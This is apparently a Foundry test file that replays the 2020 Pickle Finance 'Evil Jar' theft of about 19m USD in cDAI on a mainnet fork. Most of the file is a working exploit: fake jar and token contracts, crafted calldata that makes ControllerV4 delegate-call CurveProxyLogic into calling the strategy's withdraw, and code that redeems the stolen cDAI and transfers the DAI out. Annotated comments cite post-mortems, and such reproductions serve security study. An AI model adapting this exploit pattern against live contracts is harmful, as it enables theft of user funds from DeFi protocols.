// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

// @KeyInfo
// Total Lost : ~19m USD
//  - 19m cDAI has been stolen from `StrategyCmpdDaiV2` contract, Attacker redeem them to DAI thought Compound.
// Vulnerability Type : Incorrect Input Validation + Arbitrary Code Execution
// Attacked At : Mainnet, block height 11303123, 2020-11-21T18:37:24Z
// Attacker : 0xbac8a476b95ec741e56561a66231f92bc88bb3a8
// Exploit Contract : 0x2b0b02ce19c322b4dd55a3949b4fb6e9377f7913
// Revenue Address : 0x70178102aa04c5f0e54315aa958601ec9b7a4e08
// Victim Contract : 0xcd892a97951d46615484359355e3ed88131f829d (StrategyCmpdDaiV2)
// Attack Txs : 0xe72d4e7ba9b5af0cf2a8cfb1e30fd9f388df0ab3da79790be842bfbed11087b0, height 11303123
// Vulnerable Snippet :
//   - https://etherscan.io/address/0x6847259b2b3a4c17e7c43c54409810af48ba5210#code#F1#L249 (Incorrect Input Validation)
//   - https://etherscan.io/address/0x6186e99d9cfb05e1fdf1b442178806e81da21dd8#code#F1#L52 (Arbitrary Code Execution)
//
// @Ref
// Evil Jar Technical Post-mortem : https://github.com/banteg/evil-jar
// PeckShield : https://peckshield.medium.com/pickle-incident-root-cause-analysis-5d73496ebc9f
// BlockApex : https://medium.com/blockapex/pickle-finance-hack-analysis-poc-69b621111c3f

contract Attacker is Test {
    IDai private constant DAI = IDai(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    address private constant RevenueAddr = address(1337); // In the origin attack, this was 0x70178102AA04C5f0E54315aA958601eC9B7a4E08

    Exploit exploit;

    function setUp() public {
        vm.createSelectFork("mainnet", 11_303_122);
        exploit = new Exploit();
    }

    function testExploit() public {
        console.log("[Before Attack] DAI.balanceOf(RevenueAddr) = %18e", DAI.balanceOf(RevenueAddr));
        exploit.backdoor(RevenueAddr);
        console.log("[After Attack] DAI.balanceOf(RevenueAddr) = %18e", DAI.balanceOf(RevenueAddr));
    }
}


contract Exploit is Test {
    IStrategyCmpdDaiV2 private constant StrategyCmpdDaiV2 = IStrategyCmpdDaiV2(0xCd892a97951d46615484359355e3Ed88131f829D);
    IControllerV4 private constant ControllerV4 = IControllerV4(0x6847259b2B3A4c17e7c43C54409810aF48bA5210);
    IPickleJar private constant pDAI = IPickleJar(0x6949Bb624E8e8A90F87cD2058139fcd77D2F3F87);
    ICDaiDelegate private constant cDAI = ICDaiDelegate(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);
    IDai private constant DAI = IDai(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    address private constant CurveProxyLogic = 0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8;

    // The attacker is aiming to steal the unlevered DAI token that is held in the `strategyCmpdDaiV2` contract.
    // One thing that should noted is that the `strategyCmpdDaiV2` contract doesn't actually hold DAI token, it holds `cDAI` token with a levered amount.
    // And the `strategyCmpdDaiV2` contract does not allow the withdrawal of DAI tokens, so in fact the attacker's aiming is to steal cDAI tokens equal to the unlevered DAI tokens.

    function backdoor(address vaultAddress) external {
        FakeJar fakeJar1 = new FakeJar(address(DAI));
        FakeJar fakeJar2 = new FakeJar(address(cDAI));

        // Source code of the swapExactJarForJar() : https://etherscan.io/address/0x6847259b2b3a4c17e7c43c54409810af48ba5210#code#F1#L249
        ControllerV4.swapExactJarForJar(
            address(fakeJar1), // its `.token()` method MUST return address(DAI) to make the exploit works.
            address(fakeJar2), // it could be any contract that implements FakeJar's interface.
            StrategyCmpdDaiV2.getSuppliedUnleveraged(), // this represents how many unleveraged DAI the attacker wants to withdraw (to pDAI contract)
            0,
            new address payable[](0),
            new bytes[](0)
        );

        // This external call causes `strategyCmpdDaiV2` to redeem 19m of cDAI from Compound, and transfer redeemed DAI to the pDAI contract.
        // -> strategyCmpdDaiV2 : -19m of cDAI
        // -> pDAI : +19m of DAI
        // 19m of DAI = `strategyCmpdDaiV2.getSuppliedUnleveraged()` of DAI

        //-----
        // From here, the `pDAI` contract holds 19m of DAI tokens, those DAI tokens are earnable.
        // So the attacker calls `pDAI.earn()` three times for deposit 19m * 99.9875% of cDAI tokens into `strategyCmpdDaiV2` contract.
        //  Call: pDAI.earn()
        //  |_ pDAI.token() -> return DAI
        //  |_ ControllerV4.strategies[pDAI.token()] -> return strategyCmpdDaiV2
        //  |_ Call: strategyCmpdDaiV2.deposit()

        pDAI.earn();
        pDAI.earn();
        pDAI.earn();

        // Now, `strategyCmpdDaiV2` holds a lot amount of cDAI tokens (approximately 950m cDAI)

        //-----
        // The "want" token cannot be withdrawn from the Strategy contract, only the derivative tokens can be withdrawn.
        // The "want" token in `strategyCmpdDaiV2` is DAI token, the derivative token is cDAI token.
        // Which means there's no way to withdraw DAI from `strategyCmpdDaiV2`, only cDAI can be withdrawn.
        //
        // BTW, only the `ControllerV4` could calls `strategyCmpdDaiV2.withdraw()` to withdraw derivative tokens.
        //
        // In order to make `ControllerV4` calls any functions (i.e `strategyCmpdDaiV2.withdraw()`) that attacker wants,
        // Attacker need to found an *Approved Jar Converter* that could execute arbitrary code. (P.S: ControllerV4 will delegate call to the Approved Jar Converter)
        //   Available Approved Jar Converter:
        //     1. UniswapV2ProxyLogic
        //     2. CurveProxyLogic (this one allows code injection.)

        FakeUnderlying fakeUnderlying = new FakeUnderlying(address(cDAI));
        FakeJar fakeJar3 = new FakeJar(address(DAI));
        FakeJar fakeJar4 = new FakeJar(address(cDAI));

        address payable[] memory _targets = new address payable[](1);
        bytes[] memory _data = new bytes[](1);

        // TL;DR: The attacker crafted `_data` to make `ControllerV4` delegate-call to `curveProxyLogic.add_liquidity()`
        //        Then, curveProxyLogic.add_liquidity() will call `strategyCmpdDaiV2.withdraw(cDAI)`

        _targets[0] = payable(CurveProxyLogic);
        _data[0] = abi.encodeWithSignature(
            "add_liquidity(address,bytes4,uint256,uint256,address)",
            address(StrategyCmpdDaiV2), // curve
            bytes4(keccak256("withdraw(address)")), // curveFunctionSig
            1, // curvePoolSize
            0, // curveUnderlyingIndex
            address(fakeUnderlying) // underlying
        );

        // This crafted calldata will eventually cause the `curveProxyLogic` contract to call `strategyCmpdDaiV2.withdraw(cDAI)`
        // Calling `strategyCmpdDaiV2.withdraw(cDAI)` will causing `strategyCmpdDaiV2` transfer cDAI to `ControllerV4`
        // Then, back to the call frame of `swapExactJarForJar`,
        // The `ControllerV4` will calls `fakeJar4.deposit()` to deposit cDAI into `fakeJar4`

        ControllerV4.swapExactJarForJar(
            address(fakeJar3),
            address(fakeJar4),
            0,
            0,
            _targets,
            _data
        );

        //------
        // Now, attacker has stole 19m of cDAI from `StrategyCmpdDaiV2` contract
        // Attacker redeem those cDAI to DAI, and transfer DAI to the revenue address.

        cDAI.redeemUnderlying(cDAI.balanceOfUnderlying(address(this)));
        DAI.transfer(vaultAddress, DAI.balanceOf(address(this)));
    }
}


contract FakeJar is Test {
    IControllerV4 private constant controller = IControllerV4(0x6847259b2B3A4c17e7c43C54409810aF48bA5210);
    address private immutable Token;
    address private immutable owner;

    constructor(address _token) {
        Token = _token;
        owner = msg.sender;
    }

    function totalSupply() public pure returns (uint256) {
        return 0;
    }

    function transferFrom(address, address, uint256) public pure returns (bool) {
        return true;
    }

    function transfer(address, uint256) public pure returns (bool) {
        return true;
    }


    function decimals() public pure returns (uint256) {
        return 0;
    }

    function balanceOf(address) public pure returns (uint256) {
        return 0;
    }

    function allowance(address, address) public pure returns (uint256) {
        return 0;
    }

    function getRatio() public pure returns (uint256) {
        return 1;
    }

    function token() public view returns (address) {
        return Token;
    }

    function approve(address, uint256) public pure returns (bool) {
        return true;
    }

    function earn() public pure {}

    function deposit(uint256 amount) public {
        require(msg.sender == address(controller)); // `ControllerV4` will deposit cDAI into `fakeJar4`
        (bool suc, ) = Token.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", msg.sender, owner,amount));
        require(suc);
    }

    function withdraw(uint256) public pure {}

    function withdrawAll() public pure {}
}


contract FakeUnderlying {
    address private immutable target;

    constructor(address _target) {
        target = _target;
    }

    function approve(address, uint256) public pure returns (bool) {
        return true;
    }

    function totalSupply() public pure returns (uint256) {
        return 0;
    }

    function transferFrom(address, address, uint256) public pure returns (bool) {
        return false;
    }

    function balanceOf(address) public view returns (address) {
        return target;
    }

    function transfer(address, address, uint256) public pure returns (bool) {
        return false;
    }

    function allowance(address, address) public pure returns (uint256) {
        return 0;
    }
}

// ------------------------------------------------------------------
//                              INTERFACES
// ------------------------------------------------------------------
// Shortened interface, removed unused methods.

interface IStrategyCmpdDaiV2 {
    function getSuppliedUnleveraged() external returns (uint256);
}

interface IControllerV4 {
    function swapExactJarForJar(
        address _fromJar,
        address _toJar,
        uint256 _fromJarAmount,
        uint256 _toJarMinAmount,
        address payable[] memory _targets,
        bytes[] memory _data
    ) external returns (uint256);
}

interface IPickleJar {
    function earn() external;
}

interface ICDaiDelegate {
    function balanceOf(address owner) external view returns (uint256);
    function balanceOfUnderlying(address owner) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

interface IDai {
    function balanceOf(address) external view returns (uint256);
    function transfer(address dst, uint256 wad) external returns (bool);
}

